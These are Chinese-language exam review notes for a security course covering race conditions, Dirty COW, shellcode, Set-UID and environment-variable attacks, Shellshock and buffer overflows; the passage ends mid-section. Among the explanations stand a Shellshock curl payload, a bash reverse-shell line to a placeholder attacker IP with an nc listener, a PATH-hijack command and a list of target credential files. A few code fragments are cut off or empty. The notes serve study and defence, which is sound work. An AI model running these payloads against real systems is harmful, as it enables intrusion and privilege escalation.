7. 下面程序和 S7.6 类似，但使用 `fstat()` 检查文件描述符对应文件的 owner。这个程序是否有竞态条件？如果有，如何利用？

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int main()
{
    struct stat statbuf;
    uid_t real_uid;
    FILE* fp;

    fp = fopen("/tmp/XYZ", "a+");
    fstat(fileno(fp), &statbuf);

    printf("The file owner's user ID: %d\n", statbuf.st_uid);
    printf("The process's real user ID: %d\n", getuid());

    // Check whether the file belongs to the user
    if (statbuf.st_uid == getuid()) {
        printf("IDs match, continue to write to the file.\n");
        // write to the file ...
        if (fp) fclose(fp);
    } else {
        printf("IDs do not match, exit.\n");
        if (fp) fclose(fp);
        return -1;
    }

    return 0;
}
```

-答案：
一般没有 S7.6 中那种竞态条件漏洞。

-详细解释：
区别在于：

```c
fstat(fileno(fp), &statbuf);
```

`fstat()` 检查的是已经打开的文件描述符，也就是 `fp` 对应的真实文件。

如果攻击者让 `/tmp/XYZ` 在 `fopen()` 时指向 `/etc/passwd`，那么：

```text
fp 指向 /etc/passwd
fstat(fp) 检查的也是 /etc/passwd
```

由于 `/etc/passwd` 的 owner 通常是 root，而真实用户是普通用户，所以：

```text
statbuf.st_uid != getuid()
```

检查失败，程序不会写入。

如果攻击者让 `/tmp/XYZ` 在 `fopen()` 时指向自己拥有的文件，那么 `fstat()` 检查通过，但 `fp` 也只是指向攻击者自己的文件，不能攻击受保护文件。

所以 `fstat()` 比 `stat()` 更安全，因为它检查的是将要使用的同一个文件对象。

-PPT对应位置：
看 PPT 中 **“stat() 和 fstat() 的区别”**。

-复习重点：
`stat()` 查文件名，可能被换；`fstat()` 查已打开文件描述符，目标已经固定。

## S7.8

8. 如果我们可以锁住一个文件，就可以在 check-and-use 窗口期间锁定文件，因为其他进程不能在这段时间使用该文件。为什么不使用这种方法解决本章讨论的竞态条件问题？

-答案：
因为文件锁通常不能可靠解决这里的 TOCTTOU 问题。锁大多是 advisory lock，攻击者可以不遵守；而且攻击者攻击的是文件名和符号链接的替换，不一定是修改同一个文件内容。

-详细解释：
文件锁有几个问题：

```text
1. 很多 Unix/Linux 文件锁是 advisory lock。
   也就是只有自愿遵守锁的进程才会受影响。
   恶意攻击进程可以不加锁、不检查锁。

2. 竞态攻击常常不是修改文件内容，
   而是在 /tmp 中替换文件名、删除文件、创建符号链接。

3. 如果你想锁文件，通常要先打开它。
   但 open 本身已经是 use 了。
   如果在打开之前通过文件名检查，仍然可能有 race。

4. 锁的是文件对象，不一定锁住目录项名称。
   攻击者可能替换 /tmp/XYZ 这个名字指向的对象。
```

所以锁文件不能从根本上消除“文件名检查”和“文件名使用”之间的窗口。

更好的方法是：

```text
使用原子操作；
使用文件描述符检查；
避免 access()+open()；
遵循最小权限原则。
```

-PPT对应位置：
看 PPT 中 **“原子操作”** 和 **“应对措施”**。

-复习重点：
TOCTTOU 攻击的核心经常是替换文件名对应对象，而不是修改同一个文件内容。锁文件不等于锁住文件名。

## S7.9

9. 下面特权 Set-UID 程序是否存在竞态条件？如果有，攻击窗口在哪里？如何利用？

```c
1  filename = "/tmp/XYZ";
2  fd = open(filename, O_RDWR);
3  status = access(filename, W_OK);
...
... (code omitted) ...
...
10 if (status == ACCESS_ALLOWED) {
11     write_to_file(fd);
12 } else {
13     fprintf(stderr, "Permission denied\n");
14 }
```

-答案：
有竞态条件。攻击窗口在第 2 行 `open()` 和第 3 行 `access()` 之间。

-详细解释：
这个程序先打开文件：

```c
fd = open(filename, O_RDWR);
```

然后才检查权限：

```c
status = access(filename, W_OK);
```

问题是 `open()` 使用的是 EUID。对于 root-owned Set-UID 程序来说，EUID 是 root，所以它可以打开受保护文件。

攻击方式：

```text
1. 在第 2 行 open() 执行时，让 /tmp/XYZ 指向受保护文件，例如 /etc/passwd。
   程序以 root 权限打开它，fd 指向 /etc/passwd。

2. 在第 2 行和第 3 行之间，把 /tmp/XYZ 换成攻击者自己拥有的普通文件。

3. 第 3 行 access("/tmp/XYZ", W_OK) 检查的是普通文件，检查通过。

4. 第 11 行 write_to_file(fd) 写的是第 2 行已经打开的 fd，也就是 /etc/passwd。
```

所以检查的是普通文件，写入的是受保护文件。

-PPT对应位置：
看 PPT 中 **“竞态条件漏洞”**、**“攻击窗口”**、**“攻击步骤”**。

-复习重点：
即使顺序是 `open()` 再 `access()`，也可能有问题，因为检查和使用仍然不是同一个稳定对象。

## S7.10

10. 请用最小权限原则修复下面程序中的竞态条件问题。

```c
if (access("/tmp/XYZ", W_OK) == ACCESS_ALLOWED) {
    f = open("/tmp/XYZ", O_WRITE);
    write_to_file(f);
}
else {
    fprintf(stderr, "Permission denied\n");
}
```

-答案：
修复思路是：不要先用 `access()` 检查再用 root 权限 `open()`。应该在打开文件前把 EUID 降为真实用户 ID，让 `open()` 自己用普通用户权限完成检查和打开。

示例：

```c
uid_t ruid = getuid();
uid_t euid = geteuid();

seteuid(ruid);   // 临时放弃 root 权限

f = open("/tmp/XYZ", O_WRITE);
if (f < 0) {
    fprintf(stderr, "Permission denied\n");
} else {
    write_to_file(f);
    close(f);
}

seteuid(euid);   // 如果后续确实需要，再恢复权限
```

-详细解释：
原程序的问题是：

```text
access() 检查真实用户权限
open() 使用有效用户权限 root
```

攻击者可以让：

```text
access() 检查普通文件
open() 打开 /etc/passwd
```

修复后，在 `open()` 前执行：

```c
seteuid(getuid());
```

这样程序临时变成普通用户权限。此时即使攻击者把 `/tmp/XYZ` 换成 `/etc/passwd`，`open()` 也会失败，因为普通用户没有权限写 `/etc/passwd`。

关键思想是：

```text
让真正执行 open() 和 write() 的权限，
不超过真实用户本来应该拥有的权限。
```

如果写入完成后程序还需要 root 权限，可以再恢复；如果不需要，最好永久放弃权限。

-PPT对应位置：
看 PPT 中 **“最小特权原则”**，课件中给出了在打开文件前通过设置 EUID = RUID 来降低权限的修复思路。

-复习重点：
不要写 `access()` + `open()`。
用最小权限原则修复时，核心是：

```text
先降权，再 open。
```

### S07 总复习重点

-答案：
这一章主要掌握 TOCTTOU：程序检查和使用同一个资源之间存在时间窗口，攻击者可以在中间替换资源。

-详细解释：

```text
1. Race condition 是结果依赖执行时序的问题。
2. TOCTTOU = Time Of Check To Time Of Use。
3. access() + open() 是典型危险组合。
4. Set-UID 程序中 access() 检查 RUID，open() 使用 EUID。
5. 攻击者常用 /tmp 中的符号链接切换目标文件。
6. stat(filename) 通过文件名检查，容易被替换。
7. fstat(fd) 通过文件描述符检查，通常更安全。
8. open() 本身是内核系统调用，外部攻击者不能插入它内部。
9. 文件锁不能可靠解决符号链接替换问题。
10. 最小权限原则可以有效降低竞态条件危害。
```

-PPT对应位置：
重点看 S07 PPT 的：

```text
什么是竞态条件
TOCTTOU
竞态条件漏洞
符号链接攻击
攻击步骤
stat() / fstat()
原子操作
粘性符号链接保护
最小特权原则
```

-复习重点：
最核心一句话：

```text
竞态条件漏洞的本质是：
程序检查时看到的是一个文件，
但使用时攻击者已经把它换成了另一个文件。
```

## S8.2

2. `fork()` 系统调用会从父进程创建一个新进程。子进程会有父进程内存的副本。通常这个内存复制不是在子进程刚创建时立刻完成，而是延迟执行。请解释什么时候会发生内存复制。

-答案：
内存复制会在父进程或子进程尝试写入共享内存页时发生，也就是发生 **Copy-On-Write，写时复制**。

-详细解释：
`fork()` 后，父进程和子进程一开始通常共享同一份物理内存页。这样可以节省时间和内存。

如果父子进程都只是读取这些页面，就不需要复制。

但是如果其中一个进程尝试写某个共享页面，操作系统就会触发写时复制：

```text
1. 发现进程要写共享页面。
2. 操作系统分配一个新的物理页。
3. 把原页面内容复制到新页面。
4. 让写入方的页表指向新页面。
5. 写操作发生在新页面上。
```

这样父进程和子进程就各自拥有自己的副本，互不影响。

-PPT对应位置：
看 PPT 中 **“写时复制（Copy On Write, COW）”** 部分。课件说明 `fork()` 后父子进程先共享物理内存，只有发生写操作时才复制。

-复习重点：
COW 的核心是：

```text
读时共享，写时复制。
```

## S8.3

3. 一个进程使用 `MAP_PRIVATE` 模式把文件映射到内存，如图 1 所示。
   1）当进程向地址 `0x5100` 写数据时会发生什么？
   2）Dirty COW 的竞态条件发生在 `write()` 系统调用内部的哪里？
   3）如何利用这个竞态条件漏洞？

-答案：
1）向 `0x5100` 写入时，系统会触发写时复制，复制原始页面，创建私有副本，然后把写入发生在私有副本上。
2）Dirty COW 的问题发生在 **复制页面、更新页表、真正写入** 这几个步骤之间，因为这些步骤不是完全原子的。
3）攻击者让一个线程不停 `write()`，另一个线程不停 `madvise(..., MADV_DONTNEED)`，使页表在写入前被重新指回原始文件页，从而把本应写入私有副本的数据写到底层文件中。

-详细解释：
`MAP_PRIVATE` 的含义是：
进程可以看到文件内容，但对映射内存的修改不应该影响原始文件。修改应该只发生在该进程自己的私有副本中。

当进程写地址 `0x5100` 时，正常过程是：

```text
1. 发现该页面来自 MAP_PRIVATE 映射。
2. 内核复制原始物理页面。
3. 修改页表，让虚拟地址 0x5100 所在页面指向新复制的物理页面。
4. 写入发生在这个私有副本上。
5. 原始文件内容不变。
```

Dirty COW 的漏洞点在于：
这些步骤不是完全原子的。课件中把 COW 分为复制映射内存、更新页表、写入内存三个关键步骤，并说明这些步骤可能被其他线程打断。

攻击利用方式是：

```text
线程 1：不停通过 write() 写映射内存。
线程 2：不停调用 madvise(..., MADV_DONTNEED) 丢弃私有副本。
```

如果 `madvise()` 恰好在页表更新后、真正写入前执行，它可能把页表重新指回原始文件页。随后 `write()` 继续执行时，就可能把数据写到原始物理页，进而修改底层文件。

-PPT对应位置：
看 PPT 中 **“Dirty-COW漏洞”**、**“Dirty COW漏洞”**、**“利用 Dirty COW 漏洞”**。

-复习重点：
Dirty COW 的核心是：

```text
write() 触发 COW
madvise() 丢弃私有副本
write() 最终写到原始文件页
```

## S8.4

4. 文件 `/home/seed/zzz` 对用户 `seed` 可读可写。下面代码由 `seed` 执行。它会修改 `/home/seed/zzz` 的文件内容吗？

```c
int f = open("/home/seed/zzz", O_RDWR);
fstat(f, &st);

// Map the entire file to memory
map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE,
```

不会修改底层文件 `/home/seed/zzz` 的内容。

```c

```

但是映射类型是：

```c
MAP_PRIVATE
```

`MAP_PRIVATE` 表示写入映射内存时，会触发写时复制。也就是说，写入只影响当前进程的私有副本，不会写回原始文件。

所以：

```c
memcpy(map, "new content", strlen("new content"));
```

会改变当前进程看到的映射内存内容，但不会改变 `/home/seed/zzz` 文件本身。

如果这里使用的是：

```c
MAP_SHARED
```

则修改才可能写回到底层文件。

-PPT对应位置：
看 PPT 中 **“MAP_SHARED 和 MAP_PRIVATE”**。课件说明 `MAP_PRIVATE` 的修改对其他进程不可见，并且需要复制到私有内存中。

-复习重点：
`MAP_PRIVATE`：改的是私有副本，不是原文件。
`MAP_SHARED`：修改可能反映到底层文件。

## S8.5

5. 在 Dirty COW 攻击中，我们能不能用两个进程代替两个线程？

-答案：
普通情况下不能直接用两个独立进程代替两个线程。Dirty COW 攻击通常需要两个线程，因为线程共享同一个进程地址空间和同一份映射状态。

-详细解释：
Dirty COW 的两个动作是：

```text
线程 1：write() 写同一段映射内存。
线程 2：madvise() 丢弃同一段映射内存的私有副本。
```

这两个操作必须作用在同一个进程的同一段虚拟内存映射上。线程共享地址空间，所以一个线程的 `madvise()` 会影响另一个线程正在写的那段映射。

如果换成两个普通进程，它们有各自的虚拟地址空间和页表。即使它们映射同一个文件，进程 A 的 `madvise()` 通常只影响进程 A 自己的映射，不会直接影响进程 B 的页表状态。因此普通两个进程不能像两个线程那样直接竞争同一份映射状态。

除非使用特殊机制让两个执行流共享同一地址空间，例如本质上类似线程的 `clone(CLONE_VM)`，否则普通两个进程不适合替代两个线程。

-PPT对应位置：
看 PPT 中 **“利用 Dirty COW 漏洞”** 和 **“攻击：两个其他线程”**，课件明确讲到需要一个 `write()` 线程和一个 `madvise()` 线程相互竞争。

-复习重点：
Dirty COW 需要竞争的是同一进程中的同一段映射内存，所以用线程更合适。

## S8.6

6. 本章展示了通过 Dirty COW 修改 `/etc/passwd` 并获得 root 权限。请再说出两个可以被攻击后获得 root 权限的文件。

-答案：
可以攻击的两个典型文件是：

```text
/etc/shadow
/etc/sudoers
```

-详细解释：
如果能修改 `/etc/shadow`，攻击者可以修改 root 的密码哈希，或者修改自己账户的密码哈希，从而控制认证结果。

如果能修改 `/etc/sudoers`，攻击者可以给自己的普通账户添加 sudo 权限，例如允许自己执行所有 root 命令。

这两个文件都属于系统认证和授权的关键文件。一旦被普通用户非法修改，就可能导致权限提升。

除了这两个，也可以想到其他敏感文件，例如 root 的 SSH 授权文件：

```text
/root/.ssh/authorized_keys
```

如果攻击者能写入自己的公钥，也可能获得 root 登录能力。但考试中答 `/etc/shadow` 和 `/etc/sudoers` 最直接。

-PPT对应位置：
看 PPT 中 **“利用 Dirty COW 漏洞”**，课件使用 `/etc/passwd` 作为目标文件，并说明修改 UID 字段可以获得 root 权限。

-复习重点：
能影响认证或授权的文件都很危险：

```text
/etc/passwd
```

## S8.7

7. 如果我们使用 `MAP_PRIVATE` 把一个只读文件映射到内存，然后使用 `memcpy()` 写它，会触发 copy-on-write 吗？

-答案：
要分情况看。
如果映射内存本身是只读的，例如只用了 `PROT_READ`，那么 `memcpy()` 写入会导致访问错误，通常不会成功触发 COW。
如果映射是 `MAP_PRIVATE` 且带有 `PROT_WRITE`，那么 `memcpy()` 写入会触发 COW，但只会修改私有副本，不会修改原始文件。

-详细解释：
这题容易混，因为“只读文件”和“只读内存映射”不是完全一样。

如果文件只读，但程序使用：

```c
MAP_PRIVATE
PROT_READ | PROT_WRITE
```

映射成功后，对映射内存写入会触发 COW，操作系统会复制一份私有页面，写入发生在私有副本中，底层文件不变。

但如果映射时只给了：

```c
PROT_READ
```

那么这段映射内存本身不可写，普通 `memcpy()` 会触发段错误或保护错误，而不是正常完成 COW 写入。

Dirty COW 攻击中，课件强调：映射只读文件时，普通情况下不能直接写只读内存；攻击中使用的是 `write()` 这种路径，例如通过 `/proc/self/mem`，而不是普通 `memcpy()`。

-PPT对应位置：
看 PPT 中 **“映射只读文件”** 和 **“映射只读文件：代码”**。

-复习重点：
`memcpy()` 是普通用户态内存写。
如果映射页不可写，它会失败；Dirty COW 利用的是 `write()` 进入内核后的 COW 竞态。

## S8.8

8. 为什么不能把 copy-on-write 机制实现到 `memcpy()` 中，这样就可以用 `memcpy()` 写映射内存的私有副本？

-答案：
因为 `memcpy()` 是用户态库函数，它只是普通地执行内存写指令；而 copy-on-write 需要操作系统和 MMU 管理页表、物理页和页面权限。`memcpy()` 没有权限也没有能力完成这些内核级操作。

-详细解释：
`memcpy()` 的作用很简单：

```text
从源地址复制若干字节到目标地址。
```

它本质上只是用户态代码，执行普通的内存读写指令。

但 COW 需要做的是：

```text
1. 检测目标地址是否属于 COW 页面。
2. 分配新的物理页。
3. 把原物理页内容复制到新物理页。
4. 修改当前进程页表。
5. 设置页面权限。
6. 再执行写入。
```

这些操作涉及页表、物理内存分配和内存保护，必须由内核和硬件 MMU 完成。用户态的 `memcpy()` 不能随意修改页表，也不能绕过页面保护。

如果映射页是只读的，CPU 在 `memcpy()` 写入时会先触发保护异常，根本不会让普通写指令顺利完成。真正的 COW 处理是在页面异常处理或相关内核路径中完成的，而不是在 `memcpy()` 这种普通库函数中完成。

-PPT对应位置：
看 PPT 中 **“写时复制（Copy On Write, COW）”** 和 **“Dirty-COW漏洞”**。课件说明 COW 需要复制映射内存、更新页表、写入内存，这些都是内核级内存管理步骤。

-复习重点：
`memcpy()` 只是用户态复制函数；COW 是内核和 MMU 管理的页级机制。不能把页表管理逻辑简单放进 `memcpy()`。

## S9.4

4. 和 stack approach 相比，code segment approach 在写 shellcode 时的主要区别是什么？

-答案：
stack approach 是在运行时通过 `push` 把字符串和参数数组构造到栈上；code segment approach 是把字符串和占位数据直接放在 shellcode 后面，然后用 `jmp-call-pop` 技巧获得它们的地址。

-详细解释：
stack approach：

```text
运行时把 "/bin/sh" push 到栈上
运行时把 argv[] push 到栈上
ebx 指向栈上的 "/bin/sh"
ecx 指向栈上的 argv[]
```

code segment approach：

```text
把 "/bin/sh" 直接放在代码后面
运行时用 call/pop 得到字符串地址
再把占位字符改成 0
再构造 argv[]
```

典型结构是：

```asm
jmp short two

one:
    pop ebx
    ...

two:
    call one
    db "/bin/sh..."
```

`call one` 会把下一条指令地址压栈，而下一条指令地址正好是字符串位置。`pop ebx` 就能拿到字符串地址。

-PPT对应位置：
看 S04 PPT 的 Shellcode 部分，重点理解 **代码中不能硬编码字符串绝对地址**。

-复习重点：
code segment approach 的核心技巧是：

```text
jmp-call-pop
```

用来动态获得字符串地址。

## S9.8

8. 为什么 shellcode 通常不允许代码中出现 0？

-答案：
因为很多漏洞程序用字符串函数复制 shellcode，例如 `strcpy()`。这些函数遇到 `0x00` 会认为字符串结束，导致 shellcode 后半部分无法被复制进去。

-详细解释：
例如：

```c
strcpy(buffer, input);
```

`strcpy()` 的规则是：

```text
一直复制，直到遇到 '\0'
```

如果 shellcode 中间有：

```text
0x00
```

`strcpy()` 会提前停止。

结果是：

```text
前半段 shellcode 被复制
后半段 shellcode 丢失
攻击失败
```

所以 shellcode 通常要避免出现 binary zero。

-PPT对应位置：
看 S04 PPT 的 **“代码中的零”** 部分。

-复习重点：
Shellcode 不能有 0，是因为 `0x00` 会让字符串复制函数提前结束。

## S9.9

9. 请列出三种典型的去除 shellcode 中 0 的方法。

-答案：

```text
1. 用 xor reg, reg 生成 0，而不是 mov reg, 0。
2. 用非零占位字符，运行时再把它改成 0。
3. 用加减、移位、或位运算在运行时构造含 0 的值。
```

-详细解释：

第一种：

```asm
xor eax, eax
```

可以把 `eax` 清零，而且机器码中通常不含 `0x00`。

不要写：

```asm
mov eax, 0
```

因为立即数 0 可能导致机器码中出现 0 字节。

第二种：
先写：

```text
/bin/shX
```

运行时再执行：

```asm
mov [addr+7], al
```

把 `X` 改成 `0`。

第三种：
如果要构造某个包含 0 的数，不直接写它，而是先写一个没有 0 的数，再用移位、加减等方式变成目标值。

-PPT对应位置：
看 S04 PPT 的 **“%eax = 0（代码中避免使用 0）”** 和 **“设置字符串 /bin/sh 的结尾”** 部分。

-复习重点：
去掉 0 的基本思路是：**不要在机器码里直接写 0，而是在运行时生成 0。**

---

## S9.10

10. 我们想把字符串 `"ab"` 放到栈上，但代码中不能包含任何 0。字符串结尾需要 binary zero。请分别完成 little endian 和 big endian 机器上的代码。

```asm
mov ecx, "ab**"
... missing code ...
push ecx
```

-答案：

### 1）Little endian

```asm
mov ecx, "ab**"
shl ecx, 16
shr ecx, 16
push ecx
```

### 2）Big endian

```asm
mov ecx, "ab**"
shr ecx, 16
shl ecx, 16
push ecx
```

-详细解释：
目标是让栈上出现：

```text
'a' 'b' '\0' '\0'
```

但不能在代码中直接写 `0x00`。

### Little endian

在 little endian 中，`push ecx` 后，低字节会先进入低地址。通过：

```asm
shl ecx, 16
shr ecx, 16
```

可以把高位的 `**` 清掉，变成：

```text
ab\0\0
```

再 `push ecx`，栈上就是字符串 `"ab"`。

### Big endian

在 big endian 中，字节顺序相反，所以要先右移再左移：

```asm
shr ecx, 16
shl ecx, 16
```

这样保留高位的 `ab`，把后面的 `**` 变成 0。

-PPT对应位置：
看 S04 PPT 中 **“代码中的零”** 和 **Shellcode 避免 0** 的部分。

-复习重点：
这题考大小端：

```text
little endian：shl 再 shr
big endian：shr 再 shl
```

## S9.11

11. 请把 `0xAA00BB00` 存入 `eax` 寄存器，并且最终机器码中不能包含任何 binary zero。

-答案：

```asm
xor eax, eax        ; eax = 0
mov al, 0xAA        ; eax = 0x000000AA
shl eax, 24         ; eax = 0xAA000000

xor ebx, ebx        ; ebx = 0
mov bh, 0xBB        ; ebx = 0x0000BB00

or eax, ebx         ; eax = 0xAA00BB00
```

-详细解释：
我们不能直接写：

```asm
mov eax, 0xAA00BB00
```

因为这个立即数中含有 `00`，最终机器码里会出现 0 字节。

所以分两部分构造。

第一部分构造：

```text
0xAA000000
```

代码：

```asm
xor eax, eax
mov al, 0xAA
shl eax, 24
```

第二部分构造：

```text
0x0000BB00
```

代码：

```asm
xor ebx, ebx
mov bh, 0xBB
```

最后合并：

```asm
or eax, ebx
```

得到：

```text
eax = 0xAA00BB00
```

这些指令本身都可以避免在机器码中直接出现 `0x00`。

-PPT对应位置：
看 S04 PPT 中 **“代码中的零”**。

-复习重点：
构造含 0 的常数时，不要直接 `mov`，可以分段构造再组合。

-答案：
S09 的核心是：自己用汇编准备好 `execve()` 所需寄存器和参数，然后用 `int 0x80` 触发系统调用。

-详细解释：

```text
1. 32-bit Linux 调系统调用用 int 0x80。
2. execve() 的系统调用号是 0x0b。
3. eax = 0x0b。
4. ebx = 命令字符串地址。
5. ecx = argv[] 地址。
6. edx = envp，通常为 0。
7. argv[] 必须以 NULL 结尾。
8. stack approach 在栈上构造字符串和 argv。

10. shellcode 不能含 0，因为字符串函数遇到 0 会停止复制。

```

-PPT对应位置：


-复习重点：
最核心一句话：

```text
Shellcode = 在内存中自己构造 execve("/bin/sh", argv, 0) 的参数，然后通过 int 0x80 让内核执行它。
```

# 一、Set-UID 特权程序与环境变量实验

## 1. 实验核心一句话

> **环境变量是用户可控输入；Set-UID 程序拥有高权限，如果错误相信环境变量，就可能被普通用户影响甚至提权。**

这个实验主要围绕环境变量、Set-UID、`system()`、`execve()`、`LD_PRELOAD`、权限泄露展开。实验手册明确说目标是理解环境变量如何影响程序行为，尤其是如何影响特权 Set-UID 程序。

---

## 2. 必考点 1：环境变量会不会传给子进程？

-答案：
会。`fork()` 创建子进程时，子进程通常会继承父进程的环境变量。

-详细解释：
实验中用 `myprintenv.c` 分别让子进程和父进程打印环境变量，然后用 `diff` 比较输出。正常观察结果是：父子进程的环境变量基本相同。

-复习重点：
记住：

```text
父进程的环境变量通常会传给子进程。
```

---

## 3. 必考点 2：`execve()` 的第三个参数决定环境变量

实验中有：

```c
execve("/usr/bin/env", argv, NULL);
```

和：

```c
execve("/usr/bin/env", argv, environ);
```

-答案：
如果第三个参数是 `NULL`，新程序没有环境变量；如果第三个参数是 `environ`，新程序继承当前进程的环境变量。

-详细解释：
`execve()` 的格式是：

```c
execve(path, argv, envp);
```

其中 `envp` 就是新程序的环境变量数组。

所以：

```text
execve(..., NULL)      → 不传环境变量
execve(..., environ)   → 传递当前环境变量
```

-复习重点：
这题老师很可能考判断输出：
如果执行 `/usr/bin/env` 但 `envp = NULL`，那么几乎没有环境变量输出。

---

## 4. 必考点 3：`system()` 为什么危险？

-答案：
因为 `system()` 会启动 shell，相当于执行：

```bash
/bin/sh -c "command"
```

shell 会受 `PATH` 等环境变量影响。

-详细解释：
实验中 Set-UID 程序写了：

```c
system("ls");
```

程序员本来想执行 `/bin/ls`，但因为没有写绝对路径，shell 会根据 `PATH` 查找 `ls`。攻击者可以把自己的目录放到 `PATH` 前面：

```bash
export PATH=/home/seed:$PATH
```

然后在 `/home/seed` 里放一个假的 `ls`。如果 `/bin/sh` 没有降权保护，这个恶意 `ls` 可能以 Set-UID 程序的权限运行。实验手册专门把 `system()`、`PATH` 和 Set-UID 程序放在一起作为任务。

-复习重点：
考试写：

```text
system() 不安全，因为它调用 shell，shell 会解释命令字符串并受 PATH 等环境变量影响。
execve() 更安全，因为它直接执行指定路径，命令和参数分离，不经过 shell。
```

---

## 5. 必考点 4：`LD_PRELOAD` 对普通程序和 Set-UID 程序不同

-答案：
普通程序会受 `LD_PRELOAD` 影响；Set-UID 程序通常会忽略 `LD_PRELOAD`。

-详细解释：
实验中创建了一个动态库 `libmylib.so`，里面重写 `sleep()`。如果普通程序运行时设置了：

```bash
export LD_PRELOAD=./libmylib.so.1.0.1
```

程序会优先加载攻击者的库，调用攻击者定义的 `sleep()`。

但是如果程序是 Set-UID root 程序，动态链接器通常会进入安全模式，忽略 `LD_PRELOAD`、`LD_LIBRARY_PATH` 等危险环境变量，防止普通用户把恶意库注入高权限进程。实验手册第 7 个任务就是研究 `LD_PRELOAD` 和 Set-UID 程序的不同行为。

-复习重点：
一句话：

```text
LD_PRELOAD 可以劫持普通动态链接程序，但对 Set-UID 程序通常会被动态链接器过滤。
```

---

## 6. 必考点 5：权限泄露 Capability Leaking

实验最后的程序先用 root 权限打开 `/etc/zzz`：

```c
fd = open("/etc/zzz", O_RDWR | O_APPEND);
```

然后降权：

```c
setuid(getuid());
```

最后执行 shell：

```c
execve("/bin/sh", v, 0);
```

-答案：
有权限泄露。虽然进程降权了，但之前打开的文件描述符 `fd` 仍然指向 `/etc/zzz`，所以普通用户 shell 仍可能通过这个 fd 修改 `/etc/zzz`。

-详细解释：
权限不只存在于 UID，也存在于已经打开的文件描述符里。程序在 root 权限下打开了敏感文件，然后把 fd 留给降权后的进程，这就是能力泄露。

-复习重点：
老师可能问：

```text
为什么 setuid(getuid()) 之后仍然危险？
```

答：

```text
因为特权文件描述符已经打开，降权不会自动关闭它。
```

# 二、Shellshock 攻击实验

## 1. 实验核心一句话

> **Shellshock = Bash 从环境变量中解析函数定义时出错，导致函数定义后面的命令也被执行。**

Shellshock 实验内容包括：Bash 函数导出、环境变量、Apache CGI、curl 请求头注入、反向 shell。实验手册说明本实验的目标是通过真实攻击理解 Shellshock 漏洞如何工作。

---

## 2. 必考点 1：漏洞 Bash 和正常 Bash 的区别

实验中使用：

```bash
/bin/bash_shellshock
```

而不是系统自带的：

```bash
/bin/bash
```

-答案：
`bash_shellshock` 是有漏洞版本；系统 `/bin/bash` 是修补版本。

-详细解释：
可以设置环境变量：

```bash
export foo='() { :; }; echo vulnerable'
```

然后运行有漏洞 Bash。如果输出 `vulnerable`，说明 Bash 错误执行了函数定义后面的命令。

修补后的 Bash 不会执行 `echo vulnerable`。

-复习重点：
Shellshock payload 形式：

```bash
() { :; }; command
```

前半部分是假函数定义，后半部分才是攻击命令。

---

## 3. 必考点 2：为什么 CGI 容易被攻击？

-答案：
因为 Web 服务器会把 HTTP 请求头转换成环境变量传给 CGI 程序。

-详细解释：
例如浏览器或 curl 发出：

```text
User-Agent: my data
```

CGI 程序中可能出现环境变量：

```text
HTTP_USER_AGENT=my data
```

实验里的 `getenv.cgi` 会打印 CGI 程序的环境变量，用来观察哪些 HTTP 字段进入了环境变量。手册中明确让学生用浏览器和 curl 比较 HTTP 请求头与 CGI 环境变量。

-复习重点：
攻击链条：

```text
攻击者控制 HTTP Header
        ↓
Apache 把 Header 转成环境变量
        ↓
CGI 脚本由漏洞 Bash 执行
        ↓
Bash 解析环境变量时触发 Shellshock
```

---

## 4. 必考点 3：curl 的哪些选项能注入环境变量？

实验里常用：

```bash
curl -A "..."   # 设置 User-Agent
curl -e "..."   # 设置 Referer
curl -H "X: Y"  # 自定义 Header
```

-答案：
`-A`、`-e`、`-H` 都可以把数据放进 HTTP 头部，从而进入 CGI 环境变量。

-详细解释：
例如：

```bash
curl -A '() { :; }; echo Content-type: text/plain; echo; /bin/id' \
http://www.seed-server.com/cgi-bin/vul.cgi
```

其中 `-A` 设置 `User-Agent`，Apache 会把它变成 `HTTP_USER_AGENT` 环境变量。漏洞 Bash 读取该环境变量时执行后面的命令。

-复习重点：
老师可能问：

```text
为什么直接把命令放在 User-Agent 里不行？
```

答：

```text
因为 Bash 不会执行普通环境变量字符串。必须让环境变量值以函数定义形式 () { ...; } 开头，才能触发 Shellshock 解析漏洞。
```

---

## 5. 必考点 4：能不能偷 `/etc/shadow`？

-答案：
通常不能。

-详细解释：
CGI 程序虽然在服务器上执行，但它通常不是 root 权限，而是 Apache 用户权限，例如 `www-data`。实验任务 3.B 让你运行 `/bin/id`，目的就是查看 CGI 进程的用户身份。既然该用户没有读取 `/etc/shadow` 的权限，就无法直接窃取 `/etc/shadow`。

但 `/etc/passwd` 通常全局可读，所以可以读取。

-复习重点：
写：

```text
Shellshock 允许远程执行命令，但命令权限取决于 Web 服务器进程的权限，不一定是 root。
```

---

## 6. 必考点 5：能不能用 URL query string 触发？

例如：

```bash
curl "http://www.seed-server.com/cgi-bin/getenv.cgi?AAAAA"
```

会出现：

```text
QUERY_STRING=AAAAA
```

-答案：
通常不能直接触发 Shellshock。

-详细解释：
Shellshock 要求环境变量的值以：

```bash
() {
```

开头。

但 query string 常常变成：

```text
QUERY_STRING=name=() { :; }; command
```

或者：

```text
QUERY_STRING=AAAAA
```

如果值前面不是函数定义格式，就不会触发。

如果整个 `QUERY_STRING` 的值正好以 `() {` 开头，在某些情况下理论上可能尝试，但标准实验结论通常强调：关键不在输入来自哪里，而在它最终是否成为一个以 `() {` 开头的环境变量。

-复习重点：
一句话：

```text
不是所有用户输入都能触发 Shellshock；必须进入 Bash 环境变量，并且值要以函数定义开头。
```

---

## 7. 必考点 6：反向 shell

实验中的反向 shell 命令核心是：

```bash
/bin/bash -i > /dev/tcp/攻击者IP/端口 0<&1 2>&1
```

-答案：
它让受害服务器上的 Bash 把输入、输出、错误都重定向到攻击者机器的 TCP 连接。

-详细解释：
攻击者先监听：

```bash
nc -nv -l 9090
```

受害者执行反向 shell 后，会主动连接攻击者。之后攻击者在 netcat 中输入命令，命令实际上在受害服务器上执行。实验手册最后专门解释了 `bash -i`、`/dev/tcp`、`0<&1`、`2>&1` 的含义。

-复习重点：
老师可能考：

```text
0、1、2 分别是什么？
```

答：

```text
0 = stdin
1 = stdout
2 = stderr
```

# 三、Buffer Overflow Server 实验

## 1. 实验核心一句话

> **利用服务器程序中的 `strcpy()` 缓冲区溢出，覆盖返回地址，让程序跳到 shellcode，从而获得 root shell。**

这个实验里有多个服务器等级，主要考缓冲区溢出、栈布局、payload 构造、shellcode、NOP sled、ASLR、StackGuard、不可执行栈。实验手册说明目标是利用服务器上的漏洞程序获得 root 权限，并测试防御机制。

---

## 2. 必考点 1：漏洞在哪里？

